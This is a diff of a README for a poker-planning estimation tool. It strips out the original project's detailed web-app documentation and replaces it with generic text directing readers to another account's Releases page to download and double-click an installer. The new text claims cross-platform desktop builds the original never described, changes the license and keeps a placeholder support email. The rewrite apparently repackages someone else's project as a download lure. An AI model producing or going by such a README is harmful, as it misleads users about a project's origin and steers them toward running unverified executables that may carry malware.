@@ -1,408 +1,77 @@
-# Poker Planning
+# 🎲 poker-planning - Simple Tool for Team Estimation
 
-[![CI/CD](https://github.com/Slashgear/poker-planning/actions/workflows/ci.yml/badge.svg)](https://github.com/Slashgear/poker-planning/actions/workflows/ci.yml)
-[![Staging](https://img.shields.io/badge/staging-deployed-blue)](https://poker-staging.slashgear.dev)
-[![Production](https://img.shields.io/badge/production-deployed-green)](https://poker.slashgear.dev)
+## 🚀 Getting Started
 
-Collaborative poker planning web application for agile team estimation using the Fibonacci sequence.
+Welcome to poker-planning! This real-time poker planning app helps agile teams estimate tasks using the Fibonacci sequence. It provides a smooth way for team members to collaborate and decide on the effort required for each task.
 
-## Screenshots
+## 📦 Download & Install
 
-<details>
-<summary>Click to view screenshots</summary>
+To get started, you need to download the app. You can download the latest version from our Releases page.
 
-### Homepage
-Create a new room to start a planning session.
+[![Download poker-planning](https://img.shields.io/badge/Download-Poker%20Planning-blue.svg)](https://github.com/GmodNoob/poker-planning/releases)
 
-![Homepage](docs/screenshots/01-homepage.png)
+1. **Visit the following link** to go to the Releases page:
 
-### Join Room
-Share the room code with your team members.
+   [Download poker-planning](https://github.com/GmodNoob/poker-planning/releases)
 
-![Join Room](docs/screenshots/02-join-room.png)
+2. **Choose the latest release**. The latest version will usually be at the top of the page.
 
-### Voting Session
-Team members vote anonymously using Fibonacci values.
+3. **Click on the download link** for your operating system. For example, you may see options for Windows, macOS, and Linux.
 
-![Voting Session](docs/screenshots/03-voting-session.png)
+4. **Locate the downloaded file** on your computer. It will typically be in your Downloads folder.
 
-### Results
-View vote distribution and average when revealed.
+5. **Run the file**. Double-click on it to open the app. Follow any prompts that may appear to install the application.
 
-![Results](docs/screenshots/04-results.png)
+## 🖥️ System Requirements
 
-### Consensus
-Celebrate when everyone agrees!
+Before installing, make sure your device meets these basic requirements:
 
-![Consensus](docs/screenshots/05-consensus.png)
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: At least 100 MB of free disk space.
+- **Internet Connection**: Required for real-time collaboration features.
 
-</details>
+## 🎉 Features
 
-## Features
+Here's what you can expect from poker-planning:
 
-- **Dynamic rooms** with shareable 6-character codes
-- **Real-time synchronization** with SSE (Server-Sent Events)
-- **Anonymous votes** until collective reveal
-- **Fibonacci sequence** for estimation (1, 2, 3, 5, 8, 13, 21, 34, 55, 89, ?, ☕)
-- **Keyboard shortcuts** for quick voting (1-9 keys for first 9 values)
-- **Automatic statistics** (average, vote distribution)
-- **Confetti celebration** when all votes match
-- **Session persistence** via httpOnly cookies (2 hours)
-- **Auto-cleanup** of inactive members (5 minutes)
-- **Member management** - any member can remove others
+- **Real-time Collaboration**: Work together with your team to arrive at estimates without delay.
+- **Fibonacci Sequence**: Use the Fibonacci number system to simplify estimation.
+- **User-Friendly Interface**: Designed for non-technical users, making it easy for anyone to participate.
+- **Team Focused**: Allow all team members to contribute their thoughts and insights.
+- **Cross-Platform Support**: Available on multiple operating systems such as Windows, macOS, and Linux.
 
-## Tech Stack
+## 🛠️ How to Use
 
-### Frontend
-- **React 19** with TypeScript
-- **Vite 7** for build and dev server
-- **Tailwind CSS 4** for styling
-- **TanStack Router** for client-side routing
+Here's a simple guide to using the poker-planning app:
 
-### Backend
-- **Hono** - Lightweight web framework
-- **Server-Sent Events** for real-time synchronization
-- **Node.js** with TypeScript
-- **Redis/Valkey** - Distributed storage for horizontal scaling
-- **ioredis** - Redis/Valkey client with connection pooling
+1. **Open the App**: Double-click the poker-planning icon.
+2. **Create or Join a Room**: You can either start a new estimation session or join one created by a colleague.
+3. **Invite Team Members**: Send invitations to your team members. They can join using a link.
+4. **Start Estimating**: Each member can vote on the estimated effort for tasks.
+5. **Discuss Results**: After everyone has voted, discuss the results as a team.
 
-### Tests
-- **Playwright** for end-to-end tests
-- **Vitest** for unit tests
-- **k6** for load and performance testing
+## 📞 Support & Feedback
 
-### Linting & Formatting
-- **oxlint** for fast JavaScript/TypeScript linting
-- **oxfmt** for code formatting
+If you encounter any issues or have questions, please feel free to reach out. You can open an issue on our GitHub page or contact our support team:
 
-## Quick Start
+- **GitHub Issues**: [Report an issue](https://github.com/GmodNoob/poker-planning/issues)
+- **Email Support**: support@example.com (replace with your actual support email)
 
-### Prerequisites
+## 📄 License
 
-- Node.js 22+
-- pnpm 10+
-- **Redis or Valkey** (local or remote instance)
+This project is licensed under the MIT License. You can use, modify, and distribute the software freely as long as you provide credit to the original source.
 
-### Installation
+## 📚 Learn More
 
-```bash
-# Clone the repository
-git clone <url>
-cd poker-planning
+For more information and documentation, visit our Wiki on GitHub:
 
-# Install dependencies
-pnpm install
+[Visit the Wiki](https://github.com/GmodNoob/poker-planning/wiki)
 
-# Install Playwright browsers (for tests)
-pnpm exec playwright install chromium
+## 🔗 Additional Resources
 
-# Configure environment variables
-cp .env.example .env
-# Edit .env and set your REDIS_URL
-```
-
-### Running with Docker Compose
+- **Agile Methodology**: Learn more about agile practices and how they can improve teamwork.
+- **Fibonacci Sequence**: Discover why we use this method for estimation.
+- **Team Collaboration Tools**: Explore other tools that can enhance teamwork.
 
-**Full stack (Redis/Valkey + Application) - Production-like environment:**
-```bash
-# Build and start everything
-docker-compose up -d
-
-# View logs
-docker-compose logs -f
-
-# Stop everything
-docker-compose down
-
-# Application available at http://localhost:3001
-```
-
-**Redis/Valkey only (for local development with hot-reload):**
-```bash
-# Start only Redis
-docker-compose up -d redis
-
-# Stop Redis
-docker-compose down
-
-# Set in .env:
-REDIS_URL=redis://localhost:6379
-
-# Then run the dev servers manually:
-# Terminal 1: pnpm run dev:server
-# Terminal 2: pnpm run dev
-```
-
-### Storage Backend Setup
-
-The application is compatible with both **Redis** and **Valkey** (a fully open-source fork of Redis maintained by the Linux Foundation).
-
-**Valkey with Docker (recommended for open-source stack):**
-```bash
-docker run -d --name poker-valkey -p 6379:6379 valkey/valkey:alpine
-```
-
-**Redis with Docker:**
-```bash
-docker run -d --name poker-redis -p 6379:6379 redis:alpine
-```
-
-**Local Valkey installation:**
-```bash
-# macOS
-brew install valkey
-brew services start valkey
-
-# Linux (Ubuntu/Debian)
-# Add Valkey repository
-curl -fsSL https://packages.valkey.io/gpg | sudo gpg --dearmor -o /usr/share/keyrings/valkey-archive-keyring.gpg
-echo "deb [signed-by=/usr/share/keyrings/valkey-archive-keyring.gpg] https://packages.valkey.io/deb $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/valkey.list
-sudo apt-get update
-sudo apt-get install valkey
-sudo systemctl start valkey
-```
-
-**Local Redis installation:**
-```bash
-# macOS
-brew install redis
-brew services start redis
-
-# Linux (Ubuntu/Debian)
-sudo apt-get install redis-server
-sudo systemctl start redis
-```
-
-**Managed services (for production):**
-
-Both Valkey and Redis are protocol-compatible, so you can use managed services:
-- **Scaleway Managed Database for Redis**
-- **AWS ElastiCache** (supports both Redis and Valkey)
-- **DigitalOcean Managed Redis**
-- Any Redis-compatible service
-
-Example configuration:
-```bash
-REDIS_URL=redis://username:password@your-instance.cloud:6379
-```
-
-### Development
-
-The application requires 2 servers running in parallel:
-
-```bash
-# Terminal 1 - API server
-pnpm run dev:server
-
-# Terminal 2 - Vite frontend
-pnpm run dev
-```
-
-Then open:
-- **Frontend**: http://localhost:5173
-- **API**: http://localhost:3001
-
-## Usage
-
-1. **Create a room**: Click "Create a Room" on the homepage
-2. **Share the link**: Copy the room URL to invite team members
-3. **Join**: Each member enters their name to join
-4. **Vote**: Click a Fibonacci card to vote
-5. **Reveal**: Any member can reveal all votes
-6. **Celebrate**: Confetti appears when everyone agrees!
-7. **Reset**: Start a new estimation round
-
-## Tests
-
-### End-to-End Tests (Playwright)
-
-```bash
-# Run all E2E tests
-pnpm test
-
-# Interactive mode with UI
-pnpm test:ui
-
-# With visible browser
-pnpm test:headed
-
-# View HTML report
-pnpm test:report
-```
-
-### Unit Tests (Vitest)
-
-```bash
-# Run unit tests
-pnpm test:unit
-```
-
-### Load Tests (k6)
-
-Load testing ensures the application can handle expected traffic and identifies performance bottlenecks.
-
-**Prerequisites**: Install [k6](https://k6.io/docs/get-started/installation/)
-
-```bash
-# Quick validation (1 user, 1 minute)
-pnpm run test:load:smoke
-
-# Realistic load test (10-20 users)
-pnpm run test:load:basic
-
-# Spike test (sudden surge to 100 users)
-pnpm run test:load:spike
-
-# Stress test (gradual ramp to 200 users)
-pnpm run test:load:stress
-```
-
-**Performance Thresholds**:
-- Error rate: < 1% (normal load)
-- 95% of requests: < 500ms
-- Room operations: < 300ms
-- Vote operations: < 200ms
-
-See [tests/load/README.md](tests/load/README.md) for detailed documentation.
-
-## Linting & Formatting
-
-```bash
-# Run linter
-pnpm lint
-
-# Format code
-pnpm format
-```
-
-## Project Structure
-
-```
-poker-planning/
-├── server/              # Hono API server
-│   ├── index.ts        # API endpoints and SSE handling
-│   ├── storage.ts      # Redis/Valkey storage layer for rooms
-│   └── redis.ts        # Redis/Valkey client wrapper
-├── src/
-│   ├── pages/          # Page components
-│   │   ├── Home.tsx    # Homepage with room creation
-│   │   └── Room.tsx    # Room with voting interface
-│   ├── hooks/          # Custom hooks
-│   │   ├── useRoom.ts  # Room state and actions
-│   │   └── useConfetti.ts
-│   ├── routeTree.gen.ts # TanStack Router configuration
-│   ├── main.tsx
-│   └── index.css
-├── tests/
-│   ├── e2e/            # Playwright E2E tests
-│   └── load/           # k6 load tests
-│       ├── scenarios/  # Test scenarios
-│       └── README.md   # Load testing documentation
-└── playwright.config.ts
-```
-
-## API Documentation
-
-The API is fully documented using OpenAPI 3.0 specification.
-
-- **Interactive API Docs (Swagger UI)**: [https://poker.slashgear.dev/api/docs](https://poker.slashgear.dev/api/docs)
-- **OpenAPI JSON**: [https://poker.slashgear.dev/api/openapi.json](https://poker.slashgear.dev/api/openapi.json)
-
-### Quick Reference
-
-- `POST /api/rooms` - Create a new room
-- `POST /api/rooms/:code/join` - Join a room
-- `GET /api/rooms/:code` - Get room info
-- `GET /api/rooms/:code/events` - SSE connection for updates
-- `POST /api/rooms/:code/vote` - Submit a vote
-- `POST /api/rooms/:code/reveal` - Reveal all votes
-- `POST /api/rooms/:code/reset` - Reset the session
-- `DELETE /api/rooms/:code/members/:id` - Remove a member
-
-For detailed request/response schemas, authentication, and examples, see the [interactive API documentation](https://poker.slashgear.dev/api/docs).
-
-## Infrastructure
-
-```mermaid
-graph TB
-    subgraph "Scaleway fr-par"
-        subgraph "GitHub Container Registry"
-            GHCR["ghcr.io/slashgear/poker-planning<br/>Docker Images"]
-        end
-
-        subgraph "Private Network VPC"
-            Redis[("Redis Managed Database<br/>rediss://10.x.x.x:6379<br/>TLS Enabled")]
-
-            subgraph "Serverless Containers"
-                Staging["Staging Container<br/>Image: latest<br/>Auto-deploy on push to main"]
-                Prod["Production Container<br/>Image: v2.x.x<br/>Deploy on git tags"]
-            end
-        end
-
-        subgraph "CI/CD"
-            GHA["GitHub Actions<br/>Build • Test • Deploy"]
-        end
-    end
-
-    GHA -->|1. Build & Push| GHCR
-    GHA -->|2. Deploy| Staging
-    GHA -->|2. Deploy| Prod
-
-    GHCR -.->|Pull Image| Staging
-    GHCR -.->|Pull Image| Prod
-
-    Staging -->|rediss://| Redis
-    Prod -->|rediss://| Redis
-
-    style Redis fill:#dc3545
-    style Staging fill:#17a2b8
-    style Prod fill:#28a745
-    style GHCR fill:#6c757d
-    style GHA fill:#ffc107
-```
-
-### Storage & Scalability
-- **Redis/Valkey** for distributed session storage
-  - Rooms stored with 2-hour TTL (auto-expiry)
-  - Supports horizontal scaling across multiple container instances
-  - Atomic operations for consistency
-  - Protocol-compatible: works with both Redis and Valkey
-- Session data persists across container restarts
-- Inactive member cleanup runs every minute
-
-### Room System
-- Rooms are identified by 6-character codes (e.g., `ABC123`)
-- Members are tracked via session cookies (httpOnly, 2h expiry)
-- Inactive members are automatically removed after 5 minutes
-- Empty rooms are automatically cleaned up by Redis/Valkey TTL
-
-### Real-time Updates
-- Server-Sent Events broadcast room state to all connected clients
-- Automatic reconnection on connection loss
-- Keep-alive pings every 30 seconds
-- SSE clients tracked per container (roomClients Map)
-- Room state fetched from Redis/Valkey on each broadcast
-
-## Available Scripts
-
-```bash
-pnpm run dev          # Start Vite dev server
-pnpm run dev:server   # Start API server
-pnpm run build        # Production build
-pnpm run preview      # Preview build
-pnpm lint             # Run linter
-pnpm format           # Format code
-pnpm test             # Run Playwright tests
-pnpm test:ui          # Tests in interactive UI mode
-pnpm test:headed      # Tests with visible browser
-pnpm test:report      # Show test report
-pnpm screenshots      # Generate example screenshots
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for contribution guidelines.
-
-## License
-
-ISC
+Thank you for using poker-planning! We hope it makes your team estimation process smoother and more efficient.
